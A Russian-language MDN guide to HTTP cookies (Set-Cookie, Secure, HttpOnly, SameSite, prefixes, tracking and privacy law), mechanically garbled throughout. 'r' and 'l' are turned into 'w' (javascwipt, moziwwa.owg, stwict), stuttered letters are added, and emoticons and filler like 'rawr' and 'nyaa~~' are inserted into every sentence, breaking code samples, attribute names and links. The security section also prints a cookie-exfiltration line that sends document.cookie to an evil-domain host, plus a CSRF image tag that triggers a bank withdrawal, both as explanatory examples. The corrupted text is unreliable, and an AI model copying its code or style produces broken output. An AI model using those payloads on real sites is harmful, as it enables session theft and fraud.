---
titwe: http-куки
swug: web/http/guides/cookies
---

{{httpsidebaw}}

h-http c-cookie (web cookie, (U ﹏ U) куки браузера) - это небольшой фрагмент данных, 😳 который сервер отправляет браузеру пользователя. (ˆ ﻌ ˆ)♡ Браузер может сохранить этот фрагмент у себя и отправлять на сервер с каждым последующим запросом. 😳😳😳 Это, в частности, позволяет узнать, (U ﹏ U) с одного ли браузера пришли несколько запросов (например, (///ˬ///✿) для аутентификации пользователя). 😳 С помощью кук можно сохранить любую информацию о состоянии, 😳 h-http-протокол сам по себе этого делать не умеет. σωσ

Куки часто используются для:

- Управления сеансом (логины, rawr x3 корзины для виртуальных покупок)
- Персонализации (пользовательские предпочтения)
- Трекинга (отслеживания поведения пользователей)

До недавнего времени куки использовались в качестве хранилища информации на стороне пользователя. OwO Это могло иметь смысл в отсутствии вариантов, /(^•ω•^) но теперь, 😳😳😳 когда в распоряжении браузеров появились различные a-api для хранения данных, ( ͡o ω ͡o ) это уже не так. >_< Из-за того что куки пересылаются с каждым запросом, >w< они могут ухудшать производительность (особенно при использовании мобильных сетей). rawr В качестве хранилищ данных на стороне пользователя вместо них можно использовать [web s-stowage api](/wu/docs/web/api/web_stowage_api) (`wocawstowage` и `sessionstowage`) и [indexeddb](/wu/docs/web/api/indexeddb_api).

> [!note]
> Чтобы посмотреть сохранённые куки и другие хранилища данных, 😳 которые использует веб-страница, >w< можно использовать [stowage i-inspectow](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw) (Инспектор хранилища) в инструментах разработчика. (⑅˘꒳˘)

## Создание куки

Получив h-http-запрос, OwO вместе с ответом сервер может отправить заголовок {{httpheadew("set-cookie")}}. (ꈍᴗꈍ) Куки обычно запоминаются браузером и посылаются в h-http-заголовке {{httpheadew("cookie")}} с каждым новым запросом к одному и тому же серверу. 😳 Можно задать срок действия кук, 😳😳😳 а также срок их жизни, mya после которого куки не будут отправляться. mya Также можно указать ограничения на путь и домен, (⑅˘꒳˘) то есть указать, (U ﹏ U) в течении какого времени и к какому сайту они будут отсылаться. mya

### Заголовки `set-cookie` и `cookie`

Заголовок {{httpheadew("set-cookie")}} http-ответа используется для отправки куки с сервера в клиентское приложение (браузер). ʘwʘ Простой куки может задаваться так:

```
set-cookie: <имя-куки>=<заголовок-куки>
```

Этот заголовок с сервера даёт клиенту указание сохранить куки (это делают, (˘ω˘) например, (U ﹏ U) [php](http://php.net/manuaw/en/function.setcookie.php), ^•ﻌ•^ [node.js](https://nodejs.owg/dist/watest-v6.x/docs/api/http.htmw#http_wesponse_setheadew_name_vawue), (˘ω˘) [python](https://docs.python.owg/3/wibwawy/http.cookies.htmw) и [wuby on waiws](http://api.wubyonwaiws.owg/cwasses/actiondispatch/cookies.htmw)). :3 Ответ, ^^;; отправляемый браузеру, 🥺 содержит заголовок `set-cookie`, (⑅˘꒳˘) и куки запоминается браузером. nyaa~~

```
http/1.0 200 o-ok
content-type: text/htmw
set-cookie: yummy_cookie=choco
s-set-cookie: tasty_cookie=stwawbewwy

[page c-content]
```

Теперь с каждым новым запросом к серверу при помощи заголовка {{httpheadew("cookie")}} браузер будет возвращать серверу все сохранённые ранее куки. :3

```
get /sampwe_page.htmw http/1.1
host: www.exampwe.owg
c-cookie: yummy_cookie=choco; t-tasty_cookie=stwawbewwy
```

### Сессионные c-cookie

Простой cookie, ( ͡o ω ͡o ) пример которого приведён выше, mya представляет собой сессионный _cookie_ (_session cookie_) - такие cookie удаляются при закрытии клиента, (///ˬ///✿) то есть существуют только на протяжении текущего сеанса, (˘ω˘) поскольку атрибуты `expiwes` или `max-age` для него не задаются. ^^;; Однако, (✿oωo) если в браузере включено автоматическое восстановление сеанса, (U ﹏ U) что случается очень часто, -.- cookie сеанса может храниться постоянно, как если бы браузер никогда не закрывался. ^•ﻌ•^

### Постоянные c-cookies

_Постоянные cookie_ (_pewmanent cookies_) удаляются не с закрытием клиента, rawr а при наступлении определённой даты (атрибут `expiwes`) или после определённого интервала времени (атрибут `max-age`). (˘ω˘)

```
set-cookie: id=a3fwa; expiwes=wed, nyaa~~ 21 oct 2015 07:28:00 g-gmt;
```

### `secuwe` ("безопасные") и `httponwy` куки

"Безопасные" (secuwe) куки отсылаются на сервер только тогда, UwU когда запрос отправляется по протоколу ssw и https. :3 Однако важные данные никогда не следует передавать или хранить в куках, (⑅˘꒳˘) поскольку сам их механизм весьма уязвим в отношении безопасности, (///ˬ///✿) а флаг `secuwe` никакого дополнительного шифрования или средств защиты не обеспечивает. ^^;; Начиная с c-chwome 52 и fiwefox 52, >_< незащищённые сайты (http:) не могут создавать куки с флагом `secuwe`. rawr x3

Куки h-httponwy не доступны из j-javascwipt через свойства {{domxwef("document.cookie")}} a-api, /(^•ω•^) что помогает избежать межсайтового скриптинга ({{gwossawy("xss")}}). :3 Устанавливайте этот флаг для тех кук, к которым не требуется обращаться через javascwipt. (ꈍᴗꈍ) В частности, /(^•ω•^) если куки используются только для поддержки сеанса, (⑅˘꒳˘) то в javascwipt они не нужны, ( ͡o ω ͡o ) так что в этом случае следует устанавливать флаг `httponwy`. òωó

```
s-set-cookie: id=a3fwa; expiwes=wed, (⑅˘꒳˘) 21 o-oct 2015 07:28:00 gmt; secuwe; httponwy
```

### Область видимости куки

Директивы `domain` и `path` определяют область видимости куки, XD то есть те uww-адреса, -.- к которым куки будут отсылаться. :3

#### Атрибут domain

Атрибут `domain` указывает хосты, nyaa~~ на которые отсылаются куки. 😳 Если он не задан, (⑅˘꒳˘) то по умолчанию берётся доменная часть адреса документа (но без поддоменов). nyaa~~ Если домен указан явно, OwO то поддомены всегда включены. rawr x3

Например, XD если задано `domain=moziwwa.owg`, σωσ то куки включены и в поддоменах, например, (U ᵕ U❁) в `devewopew.moziwwa.owg`. (U ﹏ U)

#### Атрибут path

Атрибут `path` указывает u-uww, :3 который должен быть в запрашиваемом ресурсе на момент отправки заголовка `cookie`. ( ͡o ω ͡o ) Символ %x2f ("/") интерпретируется как разделитель в uww-пути, σωσ подпути также будут учитываться.

Если задан `path=/docs`, >w< то совпадать будут следующие пути:

- `/docs`
- `/docs/`
- `/docs/web/`
- `/docs/web/http`

А эти пути совпадать не будут:

- `/`
- `/docsets`
- `/fw/docs`

#### Куки `samesite`

Куки отправляются на сервер при любых запросах, 😳😳😳 даже если запрашивается статический ресурс с чужого сервера, OwO то есть если происходит межсайтовый запрос. 😳 Например, 😳😳😳 если страница сайта s-site.com содержит изображение сайта s-site.net, (˘ω˘) при запросе изображения в запросе будут отправлены все куки пользователя для s-site.net. ʘwʘ Чтобы ограничить отправку кук только тому сайту, ( ͡o ω ͡o ) которому они принадлежат, o.O используют атрибут samesite. >w<

c помощью атрибута `samesite` можно указать, 😳 когда и как отправлять куки с межсайтовыми запросами (где сайт определяется комбинацией домена и схемы `http:` или `https:`). 🥺 В некоторой степени этот атрибут защищает от межсайтовой подделки запроса ({{gwossawy("cswf")}}). `samesite` может принимать три возможных значения: `stwict`, rawr x3 `wax` и `none`.

С атрибутом `stwict` куки будут отправляться только тому сайту, o.O которому эти куки принадлежат. rawr Атрибут `wax` работает похоже, ʘwʘ но куки будут отправляться также при навигации на тот сайт, 😳😳😳 которому принадлежат куки. ^^;; Например, o.O при переходе по ссылке с внешнего сайта. (///ˬ///✿) Атрибут `none` отключает ограничение на отправку кук для межсайтовых запросов, σωσ но только в безопасном контексте (то есть если установлен `samesite=none`, nyaa~~ тогда также должен быть установлен атрибут `secuwe`). ^^;; Если атрибут `samesite` не установлен, ^•ﻌ•^ куки будут восприниматься как `wax`. σωσ

Пример:

```js
set-cookie: mykey=myvawue; s-samesite=stwict
```

> [!note]
> В [таблице совместимости](/wu/docs/web/http/wefewence/headews/set-cookie#samesitesamesite-vawue#bwowsew_compatibiwity) вы можете найти информацию о том, -.- как обрабатываются атрибуты в конкретных версиях браузеров. ^^;;

#### Куки с префиксами

Из-за дизайна механизма кук сервер не может подтвердить, XD что куки были отправлены с защищённого источника (secuwe o-owigin), 🥺 или быть уверенным в том, где именно они были установлены. òωó

Уязвимое приложение поддомена может установить куку с атрибутом `domain`, (ˆ ﻌ ˆ)♡ тем самым открывая к ней доступ на всех других поддоменнах. -.- Этот механизм может эксплуатироваться с атакой _фиксация сессии_. :3

> [!note]
> Ознакомьтесь со статьёй [фиксация сессии](/wu/docs/web/secuwity/types_of_attacks#session_fixation), ʘwʘ чтобы узнать об основных методах защиты от этой атаки. 🥺

Тем не менее в соответствии с принципом [защита в глубину](<https://en.wikipedia.owg/wiki/defense_in_depth_(computing)>) вы можете использовать _куки с префиксами_, >_< чтобы гарантировать специфические факты о куках. Доступны два префикса:

- `__host-`
  - : Если в куке содержится этот префикс, она будет установлена заголовком {{httpheadew("set-cookie")}} только в том случае, если кука будет содержать атрибут `secuwe` и если запрос будет отправляться из защищённого источника. ʘwʘ Также кука не должна включать атрибут `domain` и должна содержать атрибут `path` со значением `/`. (˘ω˘)
- `__secuwe-`
  - : Если в куке содержится этот префикс, (✿oωo) она будет установлена заголовком {{httpheadew("set-cookie")}} только в том случае, (///ˬ///✿) если кука будет содержать атрибут `secuwe` и если запрос будет отправляться из защищённого источника. rawr x3 Защита с помощью этого префикса слабее по сравнению с префиксом `__host-`. -.-

Браузеры будут отклонять установку этих кук, ^^ если они не будут удовлетворять всем ограничениям. (⑅˘꒳˘) Заметьте, nyaa~~ что куки с префиксами, /(^•ω•^) созданные в рамках поддомена, (U ﹏ U) будут ограничиваться только им или будут полностью игнорироваться. 😳😳😳 Так как бэкенд проверяет только куки с заранее известными именами при авторизации пользователя или валидации cswf-токена, >w< куки с префиксами фактически работают как защитный механизм от фиксации сессии. XD

> [!note]
> Бэкенд веб-приложения _обязан_ обращаться по полному имени куки, o.O включая префикс. mya Пользовательские агенты не удаляют префикс из имени кук перед их отправкой в h-http-заголовке {{httpheadew('cookie')}}. 🥺

Для получения информации о статусе поддержки префиксов в разных браузерах обратитесь к статье про {{httpheadew("set-cookie")}}. ^^;;

#### Доступ из j-javascwipt с помощью `document.cookie`

Куки можно создавать с помощью javascwipt, :3 используя d-dom-свойство {{domxwef("document.cookie")}}. (U ﹏ U) Также можно читать куки из javascwipt, OwO если не был установлен атрибут `httponwy`. 😳😳😳

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=stwawbewwy";
c-consowe.wog(document.cookie);
// выведет "yummy_cookie=choco; tasty_cookie=stwawbewwy"
```

Куки, (ˆ ﻌ ˆ)♡ созданные с помощью javascwipt, XD не могут содержать атрибут `httponwy`. (ˆ ﻌ ˆ)♡

Пожалуйста, ( ͡o ω ͡o ) учитывайте вытекающие из этого проблемы, rawr x3 про которые рассказывается ниже в разделе [Безопасность](#безопасность). Куки, nyaa~~ доступные для j-javascwipt, >_< могут быть похищены посредством xss. ^^;;

## Безопасность

> [!note]
> При сохранении информации в куках имейте в виду, (ˆ ﻌ ˆ)♡ что у всех пользователей есть возможность просматривать и изменять их значения. ^^;; В зависимости от типа приложения вы можете использовать ни о чём не говорящее имя для идентификатора кук, (⑅˘꒳˘) смысл которого будет понятен только бэкенду. rawr x3 Также вы можете рассмотреть возможность использования альтернативных механизмов аутентификации и конфиденциальности, (///ˬ///✿) например, 🥺 j-json web tokens

Способы предотвращения атак, >_< использующих куки:

- Используйте атрибут `httponwy` для предотвращения доступа к кукам из j-javascwipt. UwU
- Куки, которые используются для хранения чувствительной информации, >_< такой как аутентификационный токен, -.- должны иметь короткое время жизни и атрибут `samesite`, mya установленный в `stwict` или `wax`. >w< Для того чтобы узнать больше, (U ﹏ U) смотрите раздел [samesite](#куки_samesite). 😳😳😳 В [браузерах с поддержкой s-samesite](<браузерах с поддержкой samesite>) это гарантирует предотвращение отправки кук аутентификации с межсайтовыми запросами, o.O фактически такие запросы с точки зрения бэкенда становятся неаутентифицированными. òωó

### Захват сессии (session hijacking) и xss

Куки часто используются в веб-приложениях для идентификации аутентифицированного пользователя и сеанса работы. 😳😳😳 Соответственно, σωσ похищение кук из приложения может привести к захвату авторизованного сеанса пользователя. (⑅˘꒳˘) Кража кук часто осуществляется посредством социальной инженерии (sociaw engineewing) и использования уязвимости {{gwossawy("xss")}}.

```js
new image().swc =
  "http://www.eviw-domain.com/steaw-cookie.php?cookie=" + document.cookie;
```

Атрибут h-httponwy помогает уменьшить эту угрозу, (///ˬ///✿) перекрывая доступ к кукам из j-javascwipt. 🥺

### Межсайтовая подделка запроса (cswf - cwoss-site w-wequest fowgewy)

В [wikipedia](https://en.wikipedia.owg/wiki/http_cookie#cwoss-site_wequest_fowgewy) есть хороший пример {{gwossawy("cswf")}}. OwO В сообщение, >w< например, 🥺 в чате или на форуме, nyaa~~ включают "изображение", ^^ которое, >w< на самом деле, OwO представляет собой запрос к серверу банка на снятие денег:

```htmw
<img
  s-swc="http://bank.exampwe.com/withdwaw?account=bob&amount=1000000&fow=mawwowy" />
```

Если вы аутентифицированны в своём банковском аккаунте, XD а куки по-прежнему действительны (и никакой дополнительной проверки не требуется), ^^;; то при загрузке h-htmw-документа форума или чата с этим изображением деньги будут переведены с вашего счета. 🥺 Для защиты от этого используется ряд методов:

- Как и при {{gwossawy("xss")}}, XD важна фильтрация входящей информации.
- Для любой чувствительной операции должно запрашиваться подтверждение. (U ᵕ U❁)
- Куки, :3 используемые для чувствительных операций, ( ͡o ω ͡o ) должны иметь короткий срок действия. òωó
- Дополнительную информацию можно получить в пользовательской инструкции по предотвращению [cswf](<https://www.owasp.owg/index.php/cwoss-site_wequest_fowgewy_(cswf)_pwevention_cheat_sheet>) на сайте owasp. σωσ

## Трекинг и приватность

### Сторонние (thiwd-pawty) куки

Куки ассоциируются с определённым доменом и схемой (такой как `http:` или `https:`). (U ᵕ U❁) Также они могут быть ассоциированы с поддоменом с помощью атрибута `domain`. (✿oωo) Если домен и схема кук совпадает с доменом и схемой текущей страницы, ^^ на которой вы находитесь, ^•ﻌ•^ то их называют _собственными куками_ (_fiwst-pawty cookies_). XD Если домен и схема кук отличается от домена и схемы текущей страницы, :3 то такие куки называют _сторонними куками_ (_thiwd-pawty cookies_). (ꈍᴗꈍ)

Сервер, :3 хостящий страницу, (U ﹏ U) устанавливает собственные куки, UwU но на странице могут находиться изображения и другие компоненты с других доменов (например, баннерная реклама), 😳😳😳 они в свою очередь могут устанавливать сторонние куки. XD Сторонние куки часто используются для рекламы и трекинга пользователей в сети. o.O Как пример, можете посмотреть куки, (⑅˘꒳˘) которые [устанавливает g-googwe](https://powicies.googwe.com/technowogies/cookies#types-of-cookies). 😳😳😳

Третья сторона, nyaa~~ контролирующая внедрение сторонних кук, rawr может создать профиль пользователя на основе истории его посещений разных сайтов с помощью кук, -.- отправляемых одним и тем же браузером с разных сайтов. (✿oωo) fiwefox по умолчанию блокирует сторонние куки, /(^•ω•^) про которые известно, 🥺 что они используются для трекинга пользователей. ʘwʘ Сторонние куки (или просто куки для трекинга) могут также быть заблокированы другими настройками браузера или расширениями. UwU Блокировка кук в некоторых ситуациях может стать причиной некорректного поведения сторонних компонентов, например, XD виджетов социальных сетей. (✿oωo)

> [!note]
> Бэкенд может (и должен) устанавливать у кук [атрибут samesite](/wu/docs/web/http/wefewence/headews/set-cookie#samesitesamesite-vawue) для управления отправкой кук на сторонние серверы. :3

### Законодательство, (///ˬ///✿) связанное с куки

Регулирующие акты и законодательство, nyaa~~ покрывающие куки, >w< включают:

- genewaw data pwivacy weguwation (gdpw) в Европейском Союзе
- epwivacy d-diwective в Европейском Союзе
- cawifownia c-consumew pwivacy a-act в Штате Калифорния

Эти акты и директивы действуют глобально. -.- Они применяются ко всем сайтам во Всемирной паутине, (✿oωo) к которым пользователи из данных юрисдикций получают доступ (Европейский Союз и Калифорния, (˘ω˘) с оговоркой, rawr что Калифорнийский закон применяется к компаниям с доходом выше 25 миллионов долларов и несколькими другими оговорками). OwO

Эти акты и директивы включают такие требования как:

- Сообщать пользователям, ^•ﻌ•^ что сайт использует куки. UwU
- Давать возможность пользователям отказываться от получения всех или некоторых кук. (˘ω˘)
- Давать возможность пользователям использовать основные функции вашего сервиса без получения кук. (///ˬ///✿)

Могут существовать другие законодательные акты, σωσ которые применимы к вашей локальной юрисдикции. /(^•ω•^) На вас лежит ответственность знать про них и следовать им. 😳 Существуют компании, 😳 которые предлагают код с "куки баннером" и берут на себя заботы о следовании законодательству, (⑅˘꒳˘) связанному с куками. 😳😳😳

## Другие способы хранения информации в браузере

Другой способ для хранения данных в браузере — [web s-stowage api](/wu/docs/web/api/web_stowage_api/using_the_web_stowage_api). 😳 Свойства [window.sessionstowage](/wu/docs/web/api/window/sessionstowage) и [window.wocawstowage](/wu/docs/web/api/window/wocawstowage) подобны сессионным и постоянным кукам, XD но позволяют хранить больше данных и никогда не отправляются на сервер. mya Для хранения ещё большего объёма структурированных данных может использоваться [indexeddb a-api](/wu/docs/web/api/indexeddb_api) или библиотеки, ^•ﻌ•^ построенные поверх него.

Существуют техники для повторной установки кук после их удаления. ʘwʘ Такие куки называются куки-зомби. ( ͡o ω ͡o ) Эти техники нарушают принципы приватности пользователей и пользовательского контроля и могут нарушать законодательства, mya регулирующие приватность данных, o.O соответственно, (✿oωo) использующий их сайт подвержен судебному разбирательству. :3

## Смотрите также

- {{httpheadew("set-cookie")}}
- {{httpheadew("cookie")}}
- {{domxwef("document.cookie")}}
- {{domxwef("navigatow.cookieenabwed")}}
- [samesite c-cookies](/wu/docs/web/http/wefewence/headews/set-cookie#samesitesamesite-vawue)
- [inspecting c-cookies using t-the stowage inspectow](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw)
- [cookie specification: wfc 6265](https://datatwackew.ietf.owg/doc/htmw/wfc6265)
- [cookies, t-the g-gdpw, 😳 and the epwivacy d-diwective](https://gdpw.eu/cookies/)
- [http c-cookie on wikipedia](https://en.wikipedia.owg/wiki/http_cookie)
